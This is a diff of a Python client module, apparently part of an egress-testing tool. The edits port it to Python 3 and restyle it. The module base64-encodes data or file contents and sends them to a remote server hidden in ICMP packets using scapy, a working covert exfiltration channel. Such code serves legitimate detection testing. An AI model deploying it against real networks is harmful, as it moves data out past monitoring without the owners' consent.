@@ -1,4 +1,4 @@
-'''
+"""
 
 This is the template that should be used for client modules.
 A brief description of the client module can/should be placed
@@ -7,12 +7,14 @@ comments and class declaration.
 
 Finally, be sure to rename your client module to a .py file
 
-'''
+"""
 
 import base64
 import re
 import socket
 import sys
+
+from scapy.layers.inet import IP, ICMP
 from common import helpers
 from scapy.all import *
 
@@ -40,34 +42,32 @@ class Client:
         if helpers.validate_ip(self.remote_server):
             final_destination = self.remote_server
         else:
-            print "[*] Resolving IP of domain..."
+            print('[*] Resolving IP of domain...')
             final_destination = socket.gethostbyname(self.remote_server)
 
         # calcalate total packets
-        if ((len(data_to_transmit) % self.length) == 0):
+        if (len(data_to_transmit) % self.length) == 0:
             total_packets = len(data_to_transmit) / self.length
         else:
             total_packets = (len(data_to_transmit) / self.length) + 1
         self.current_total = total_packets
 
-        while (byte_reader < len(data_to_transmit)):
+        while byte_reader < len(data_to_transmit):
             if not self.file_transfer:
                 encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
             else:
                 encoded_data = base64.b64encode(self.file_transfer +
-                    ".:::-989-:::." + data_to_transmit[byte_reader:byte_reader + self.length])
+                                                ".:::-989-:::." + data_to_transmit[byte_reader:byte_reader + self.length])
 
-            print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)
+            print('[*] Packet Number/Total Packets:        ' + str(packet_number) + "/" + str(total_packets))
 
             # Craft the packet with scapy
             try:
-                send(IP(dst=final_destination)/ICMP()/(encoded_data), verbose=False)
+                send(IP(dst=final_destination) / ICMP() / encoded_data, verbose=False)
             except KeyboardInterrupt:
-                print "[*] Shutting down..."
+                print('[*] Shutting down...')
                 sys.exit()
 
             # Increment counters
             byte_reader += self.length
             packet_number += 1
-
-        return
